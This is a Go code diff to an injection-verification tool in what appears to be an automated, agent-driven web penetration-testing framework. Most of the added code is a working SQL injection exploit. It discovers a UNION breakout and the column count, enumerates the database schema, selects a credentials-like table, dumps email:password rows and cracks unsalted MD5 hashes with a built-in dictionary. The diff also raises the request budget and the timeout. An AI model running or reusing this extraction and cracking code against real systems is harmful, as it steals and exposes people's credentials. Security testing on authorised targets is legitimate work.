@@ -67,7 +67,7 @@ var sqlAuthBypassPayloads = []string{
 // the parameter is concatenated into a query.
 var quoteProbes = []string{"'", "\"", "')", "';", "'--", "\"--"}
 
-const injectionMaxRequests = 200
+const injectionMaxRequests = 320
 
 func looksAuthenticated(body string) bool {
 	return jwtRe.MatchString(body) || authTokenRe.MatchString(body)
@@ -144,9 +144,9 @@ func probeAuthBypass(ctx context.Context, client *http.Client, root string, budg
 	return ""
 }
 
-// probeParamSQLi injects quote payloads into each query param of urlStr; returns a
-// confirmation string if a SQL error is provoked (error-based / V14), plus a UNION
-// column-count note when resolvable.
+// probeParamSQLi injects quote payloads into each query param of urlStr; on a SQL
+// error (error-based / V14) AND/OR a working UNION it reports injection, and when a
+// UNION reflects it attempts a generic data dump (V02 extraction + V12 weak hashes).
 func probeParamSQLi(ctx context.Context, client *http.Client, urlStr string, budget *int) string {
 	base, err := url.Parse(urlStr)
 	if err != nil {
@@ -157,9 +157,10 @@ func probeParamSQLi(ctx context.Context, client *http.Client, urlStr string, bud
 		return ""
 	}
 	for name := range q {
+		errProbe := ""
 		for _, qp := range quoteProbes {
 			if ctx.Err() != nil || *budget <= 0 {
-				return ""
+				break
 			}
 			u := *base
 			nq := u.Query()
@@ -167,48 +168,267 @@ func probeParamSQLi(ctx context.Context, client *http.Client, urlStr string, bud
 			u.RawQuery = nq.Encode()
 			*budget--
 			_, body, ok := getBody(ctx, client, u.String())
-			if !ok {
-				continue
-			}
-			if sqlErrorRe.MatchString(body) {
-				union := probeUnionColumns(ctx, client, base, name, budget)
-				msg := fmt.Sprintf(
-					"SQL injection at %s (param %q): payload %q provoked a verbose SQL error (this is BOTH an injectable "+
-						"parameter and a V14 verbose-error disclosure)", base.Path, name, qp)
-				if union != "" {
-					msg += "; " + union
-				}
-				return msg
+			if ok && sqlErrorRe.MatchString(body) {
+				errProbe = qp
+				break
 			}
 		}
+		union := dumpUnion(ctx, client, base, name, budget)
+		if errProbe == "" && union == "" {
+			continue
+		}
+		var parts []string
+		if errProbe != "" {
+			parts = append(parts, fmt.Sprintf("payload %q provoked a verbose SQL error (injectable parameter + V14 verbose-error disclosure)", errProbe))
+		}
+		if union != "" {
+			parts = append(parts, union)
+		}
+		return fmt.Sprintf("SQL injection at %s (param %q): %s", base.Path, name, strings.Join(parts, "; "))
 	}
 	return ""
 }
 
-// probeUnionColumns finds the UNION column count on an injectable GET param by
-// incrementing NULLs until the SQL error clears. Best effort, bounded.
-func probeUnionColumns(ctx context.Context, client *http.Client, base *url.URL, param string, budget *int) string {
-	orig := base.Query().Get(param)
-	for n := 1; n <= 12; n++ {
-		if ctx.Err() != nil || *budget <= 0 {
-			return ""
+// --- generic UNION data dump (V02 extraction) + weak-hash surfacing (V12) --------
+//
+// Once a GET parameter is injectable, this extracts real data instead of merely
+// proving a column count: it discovers a working UNION (breakout/comment/column
+// count via REFLECTED string markers), enumerates a credentials-like table from the
+// schema (sqlite_master, then information_schema), dumps identity:secret rows, and
+// classifies the secrets (32-hex -> unsalted MD5 = V12). All generic technique: a
+// breakout/comment battery, a column-noun wordlist, no target-specific table/column
+// names baked in.
+
+var sqlBreakouts = []string{"'))", "')", "'", "\"", "))", ""}
+var sqlComments = []string{"-- -", "-- "}
+
+var sqlUserTableRe = regexp.MustCompile(`(?i)[A-Za-z0-9_]*(?:user|account|member|credential|customer|login)[A-Za-z0-9_]*`)
+var sqlMailColRe = regexp.MustCompile(`(?i)[A-Za-z0-9_]*(?:email|mail)[A-Za-z0-9_]*`)
+var sqlIdentColRe = regexp.MustCompile(`(?i)[A-Za-z0-9_]*(?:username|userid|user|login|account|name)[A-Za-z0-9_]*`)
+var sqlPassColRe = regexp.MustCompile(`(?i)[A-Za-z0-9_]*(?:password|passwd|pwd|secret|hash)[A-Za-z0-9_]*`)
+var hexOnlyRe = regexp.MustCompile(`^[0-9a-fA-F]+$`)
+
+const (
+	dumpSentStart = "AFXS9K"
+	dumpSentEnd   = "9KAFXE"
+	dumpRowLimit  = 25
+)
+
+func injectParamURL(base *url.URL, param, payload string) string {
+	u := *base
+	q := u.Query()
+	q.Set(param, q.Get(param)+payload)
+	u.RawQuery = q.Encode()
+	return u.String()
+}
+
+// jsonUnescapeLite reverses the common JSON string escapes, enough to read a dumped
+// value out of a JSON response body.
+func jsonUnescapeLite(s string) string {
+	return strings.NewReplacer(`\n`, "\n", `\t`, "\t", `\/`, "/", `\"`, `"`, `\\`, `\`).Replace(s)
+}
+
+// unionMarker is the per-column discovery value: a NUMERIC string (so a
+// type-sensitive column like a price/id does not make the app error on the row)
+// that is still distinctive enough to detect in the response.
+func unionMarker(i int) string { return fmt.Sprintf("'%d'", 9000000+i) }
+
+// betweenAll returns every substring delimited by a...b in s (non-overlapping).
+func betweenAll(s, a, b string) []string {
+	var out []string
+	for {
+		i := strings.Index(s, a)
+		if i < 0 {
+			return out
 		}
-		nulls := strings.Repeat("NULL,", n-1) + "NULL"
-		payload := orig + "' UNION SELECT " + nulls + "-- -"
-		u := *base
-		nq := u.Query()
-		nq.Set(param, payload)
-		u.RawQuery = nq.Encode()
-		*budget--
-		st, body, ok := getBody(ctx, client, u.String())
-		if !ok {
-			continue
+		s = s[i+len(a):]
+		j := strings.Index(s, b)
+		if j < 0 {
+			return out
 		}
-		if st >= 200 && st < 300 && !sqlErrorRe.MatchString(body) {
-			return fmt.Sprintf("UNION-based injection confirmed with %d column(s)", n)
+		out = append(out, jsonUnescapeLite(s[:j]))
+		s = s[j+len(b):]
+	}
+}
+
+// fetchAllInjected runs one UNION payload and returns every sentinel-delimited value
+// in the response (one per UNION row).
+func fetchAllInjected(ctx context.Context, client *http.Client, base *url.URL, param, payload string, budget *int) []string {
+	if *budget <= 0 || ctx.Err() != nil {
+		return nil
+	}
+	*budget--
+	_, body, ok := getBody(ctx, client, injectParamURL(base, param, payload))
+	if !ok {
+		return nil
+	}
+	return betweenAll(body, dumpSentStart, dumpSentEnd)
+}
+
+// orderPositions prefers a non-first output column (the first column is often a
+// type-sensitive id that errors on a long string), then the first.
+func orderPositions(r []int) []int {
+	var nz, z []int
+	for _, p := range r {
+		if p == 0 {
+			z = append(z, p)
+		} else {
+			nz = append(nz, p)
 		}
 	}
-	return ""
+	return append(nz, z...)
+}
+
+func dumpUnion(ctx context.Context, client *http.Client, base *url.URL, param string, budget *int) string {
+	// 1. find breakout + column count. Numeric markers (type-safe) and a 2xx gate:
+	//    at the RIGHT column count the app returns the injected rows with HTTP 200;
+	//    wrong counts error (500) and are skipped.
+	breakout, comment, n := "", "", 0
+	var reflected []int
+findUnion:
+	for col := 1; col <= 12; col++ {
+		for _, bo := range sqlBreakouts {
+			for _, cm := range sqlComments {
+				if *budget <= 0 || ctx.Err() != nil {
+					break findUnion
+				}
+				cols := make([]string, col)
+				for i := range cols {
+					cols[i] = unionMarker(i)
+				}
+				*budget--
+				st, body, ok := getBody(ctx, client, injectParamURL(base, param, bo+" UNION SELECT "+strings.Join(cols, ",")+" "+cm))
+				if !ok || st < 200 || st >= 300 {
+					continue
+				}
+				var hits []int
+				for i := 0; i < col; i++ {
+					if strings.Contains(body, fmt.Sprintf("%d", 9000000+i)) {
+						hits = append(hits, i)
+					}
+				}
+				if len(hits) > 0 {
+					breakout, comment, n, reflected = bo, cm, col, hits
+					break findUnion
+				}
+			}
+		}
+	}
+	if n == 0 {
+		return ""
+	}
+	colNote := fmt.Sprintf("UNION confirmed (%d columns)", n)
+
+	// extract places a BARE column expression (wrapped in sentinels) into the UNION
+	// with a FROM clause appended, so the source yields one UNION row per source row
+	// (the working pattern: FROM on the UNION SELECT, bare columns, not aggregates or
+	// scalar subqueries). It returns EVERY sentinel-delimited value found, trying each
+	// reflected output column (preferring a string-friendly one) and caching the first
+	// that works for the rest of the dump.
+	positions := orderPositions(reflected)
+	good := -1
+	extract := func(colExpr, fromClause string) []string {
+		try := positions
+		if good >= 0 {
+			try = []int{good}
+		}
+		for _, p := range try {
+			cols := make([]string, n)
+			for i := range cols {
+				cols[i] = unionMarker(i)
+			}
+			cols[p] = "'" + dumpSentStart + "'||(" + colExpr + ")||'" + dumpSentEnd + "'"
+			payload := breakout + " UNION SELECT " + strings.Join(cols, ",")
+			if fromClause != "" {
+				payload += " " + fromClause
+			}
+			payload += " " + comment
+			if vs := fetchAllInjected(ctx, client, base, param, payload, budget); len(vs) > 0 {
+				good = p
+				return vs
+			}
+		}
+		return nil
+	}
+
+	// 2. enumerate tables: sqlite_master, then information_schema.
+	engine := "sqlite"
+	tables := extract("name", "FROM sqlite_master WHERE type='table'")
+	if len(tables) == 0 {
+		engine = "information_schema"
+		tables = extract("table_name", "FROM information_schema.tables")
+	}
+	tbl := sqlUserTableRe.FindString(strings.Join(tables, ","))
+	if tbl == "" {
+		return colNote + ", but no credentials-like table resolved from the schema (extraction not completed)"
+	}
+
+	// 3. resolve identity + secret columns of that table.
+	var schema string
+	if engine == "sqlite" {
+		schema = strings.Join(extract("sql", "FROM sqlite_master WHERE name='"+tbl+"'"), " ")
+		// Drop "CREATE TABLE <name>" so the table name (which contains "user") is not
+		// mistaken for an identity COLUMN; column defs live inside the first paren.
+		if i := strings.Index(schema, "("); i >= 0 {
+			schema = schema[i+1:]
+		}
+	} else {
+		schema = strings.Join(extract("column_name", "FROM information_schema.columns WHERE table_name='"+tbl+"'"), " ")
+	}
+	emailCol := sqlMailColRe.FindString(schema) // prefer a real email/mail column
+	if emailCol == "" {
+		emailCol = sqlIdentColRe.FindString(schema) // else username/login/name
+	}
+	passCol := sqlPassColRe.FindString(schema)
+	if passCol == "" {
+		return colNote + fmt.Sprintf(", table %q found but no secret-like column resolved (extraction not completed)", tbl)
+	}
+	if emailCol == "" {
+		emailCol = passCol
+	}
+
+	// 4. dump bounded rows (one UNION row per source row).
+	rows := extract(
+		fmt.Sprintf("%s||char(58)||%s", emailCol, passCol),
+		fmt.Sprintf("FROM %s LIMIT %d", tbl, dumpRowLimit))
+	if len(rows) == 0 {
+		return colNote + fmt.Sprintf(", table %q (%s:%s) found but the row dump came back empty", tbl, emailCol, passCol)
+	}
+
+	// 5. parse + classify hashes.
+	md5, total, sample := 0, 0, ""
+	for _, ln := range rows {
+		if ln = strings.TrimSpace(ln); ln == "" {
+			continue
+		}
+		total++
+		h := ln
+		if i := strings.LastIndex(ln, ":"); i >= 0 {
+			h = ln[i+1:]
+		}
+		if len(h) == 32 && hexOnlyRe.MatchString(h) {
+			md5++
+		}
+		if sample == "" {
+			sample = ln
+		}
+	}
+	verdict := fmt.Sprintf("%s. DATA EXTRACTED (V02): dumped %d row(s) from table %q (%s:%s) via UNION", colNote, total, tbl, emailCol, passCol)
+	if md5 > 0 {
+		verdict += fmt.Sprintf("; %d secret(s) are unsalted 32-hex MD5 (V12 weak-hash finding)", md5)
+		// V12 end-to-end: quick-crack the dumped MD5s against the built-in common
+		// password list (embedded only, bounded). A bigger dictionary is available via
+		// the standalone hash_crack tool.
+		if cracked := crackMD5(extractMD5Hashes(strings.Join(rows, "\n")), embeddedWords(), len(embeddedWords())); len(cracked) > 0 {
+			var cs []string
+			for h, w := range cracked {
+				cs = append(cs, h+"="+w)
+			}
+			verdict += fmt.Sprintf("; %d CRACKED with the built-in dictionary: %s", len(cracked), clipXSS(strings.Join(cs, ", "), 160))
+		}
+	}
+	verdict += fmt.Sprintf(" (sample: %s)", clipXSS(sample, 80))
+	return verdict
 }
 
 // probeNoSQL replaces each string field of a JSON body with a Mongo operator object
@@ -297,7 +517,7 @@ func (t *ToolSet) injectionVerify() actool.CoreTool {
 		},
 		"required": []any{"url"},
 	}
-	desc := "Deterministically CONFIRM or REFUTE SQL/NoSQL injection from EVIDENCE, not a hunch. Given a base URL it sweeps common login paths and confirms an authentication bypass only if an OR-1=1 payload authenticates where wrong credentials did not. Given a URL with query params it injects quote payloads and confirms SQL injection on a verbose SQL error (also a V14 disclosure), then probes the UNION column count. Given a JSON body it injects Mongo operators and confirms NoSQL injection on a material response divergence. Use this instead of concluding injection from a single error or a 200: a reflected error is not a dump, and a 200 is not a bypass. Pass the base URL for auth-bypass, or an endpoint URL (with params or a JSON body) for injection."
+	desc := "Deterministically CONFIRM or REFUTE SQL/NoSQL injection from EVIDENCE, not a hunch. Given a base URL it sweeps common login paths and confirms an authentication bypass only if an OR-1=1 payload authenticates where wrong credentials did not. Given a URL with query params it injects quote payloads and confirms SQL injection on a verbose SQL error (also a V14 disclosure), then attempts a generic UNION data dump (enumerate schema, dump a credentials table, flag weak MD5 hashes). Given a JSON body it injects Mongo operators and confirms NoSQL injection on a material response divergence. Use this instead of concluding injection from a single error or a 200: a reflected error is not a dump, and a 200 is not a bypass. Pass the base URL for auth-bypass, or an endpoint URL (with params or a JSON body) for injection."
 	return readTool("injection_verify", desc, schema, func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
 		var a struct {
 			URL    string `json:"url"`
@@ -319,7 +539,7 @@ func (t *ToolSet) injectionVerify() actool.CoreTool {
 				return http.ErrUseLastResponse
 			},
 		}
-		runCtx, cancel := context.WithTimeout(ctx, 60*time.Second)
+		runCtx, cancel := context.WithTimeout(ctx, 120*time.Second)
 		defer cancel()
 		budget := injectionMaxRequests
 
@@ -444,7 +664,7 @@ func injectionAuthBypassSummary(base string) string {
 func injectionParamSummary(endpoint, param, url string) string {
 	return fmt.Sprintf(
 		"SQL injection check on the endpoint %s: call injection_verify with the URL %s (observed query parameter: %s). "+
-			"It injects quote payloads and confirms injection on a verbose SQL error, then probes the UNION column count. "+
+			"It injects quote payloads, confirms injection on a verbose SQL error or a working UNION, then attempts a real UNION data dump (schema enumeration + credentials table + weak-hash flag). "+
 			"If CONFIRMED, report_finding (SQL injection) with the request and response as reproduction. If no SQL error "+
 			"is provoked, record_fact the negative and do NOT report_finding. Do NOT conclude injection from a bare 200.",
 		endpoint, url, param)
